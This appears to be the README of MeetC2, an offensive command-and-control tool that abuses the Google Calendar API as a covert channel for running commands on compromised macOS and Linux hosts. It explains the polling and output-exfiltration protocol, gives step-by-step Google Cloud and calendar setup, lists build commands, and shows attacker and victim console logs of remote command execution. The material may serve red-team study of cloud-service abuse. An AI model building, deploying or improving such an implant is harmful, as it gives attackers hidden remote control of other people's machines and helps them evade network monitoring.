## MeetC2

A serverless command & control (C2) framework that leverages Google Calendar APIs, as a covert communication channel between operators and a compromised system.

### Overview

MeetC2 a cross-platfrom (macOS/Linux), that demonstrates how legitimate cloud services can be abused for adversarial operations. By using Google Calendar APIs, the framework creates a hidden communication channel that blends in with normal business traffic.

Domain's utlized here are "`oauth2.googleapis.com`" & "`www.googleapis.com`". Once authenticated, the agent enters a polling loop, sending GET requests every 30 seconds to "`www.googleapis.com/calendar/v3/calendars/{calendarId}/events`" to check for new calendar events containing commands. 

When the organizer wants to issue a new command they can `POST` a new event to the same Calendar API endpoint via "organizer" agent with the command embedded in the event's summary field, like "Meeting from nobody:". The "guest" agent identifies these command events during its regular polling which extracts and executes the command locally, then updates the same event via a `PUT` request to include the command output within the `[OUTPUT] [/OUTPUT]` parameter in the description field.

<p align="center">
<img alt="image" src="https://github.com/user-attachments/assets/c9dd3c71-b5e8-4170-a526-a08461c064fc" width="500"/>
</p>

### Google Calendar Setup

- Navigate to the URL [Google cloud console](https://console.cloud.google.com/?hl=en), sign in with your Google account. Select a project or create a new project.
- Navigate to "APIs & Services" → Click "Library", in the search box, look for `Google Calendar API` and click "ENABLED", will take 20-30 seconds to get it enabled in your project.
- Post this navigate to "APIs & Services" → "Credentials" and click "+ CREATE CREDENTIALS" at the top choose "Service account" fill in the required details i.e., Service account name: `calendar-invite`, Description: `Syncs calendar events` and continue. Skip the optional role/users and click "DONE".
- Now check your service account lists you should have a email like "`calendar-invite@your-project.iam.gserviceaccount.com`". Go to the "KEYS" section "ADD KEY" → "Create new key", choose the "JSON" format and download the "KEY". Rename the downloaded JSON file to `credentials.json` for later use.
- Navigate to the URL "`https://calendar.google.com`", on the left side find "Other calendars" → Click the "+" click on create new calender fill in the name/description. Post that, click on the 3 dots next to it → "Settings and sharing". Scroll down to "Integrate calendar", check for "Calendar ID" it should look like "`abc123xyz@group.calendar.google.com`".
- Final steps, under calendar settings, find "Share with specific people" click on "+ Add people", add the service account email from step 4 above (the one ending in `@your-project.iam.gserviceaccount.com`). Change the permission to "Make changes to events" and click "Send", and you are all set...

### YouTube

<div align="center">
  <a href="https://www.youtube.com/watch?v=YkKtQ3Ex8-Q" target="_blank">
    <img src="https://img.youtube.com/vi/YkKtQ3Ex8-Q/0.jpg" alt="Watch on YouTube" title="Watch on YouTube" width="560" />
  </a>
</div>

### Command Line

<b>Compile:</b>

```
./build-all.sh <credentials.json> <calendar_id>
```

<b>Attacker host:</b>
```
bash-3.2$ ./organizer credentials.json [REDACTED]@group.calendar.google.com
MeetC2 Organizer
Commands:
  exec <cmd>         - Execute on all hosts
  exec @host:<cmd>   - Execute on specific host
  exec @*:<cmd>      - Execute on all hosts (explicit)
  list               - List recent commands
  get <event_id>     - Get command output
  clear              - Clear executed events
  exit               - Exit organizer
----------------------------------------
> exec whoami
Command created for all hosts: qfj4tt8a4uoi8p7cd3b8t31337
> 
>
```

<b>Victim host:</b>

```
bash-3.2$ ./guest-darwin-arm64 
16:08:04 MeetC2 Guest started on dhiraj-mishra-[REDACTED]
16:08:04 Calendar ID: [REDACTED]@group.calendar.google.com
16:08:04 Polling every 10 seconds...
16:08:15 Executing command: whoami
16:08:16 Successfully updated event with output
```

<b>OpSec</b>: While this is functional, I know there are improvements in OpSec specifically for the "guest" binary.

<b>Acknowledgements</b>: This project was inspired by [GC2-sheet](https://github.com/looCiprian/GC2-sheet) author [looCiprian](https://github.com/looCiprian). Hence, special thanks to him!
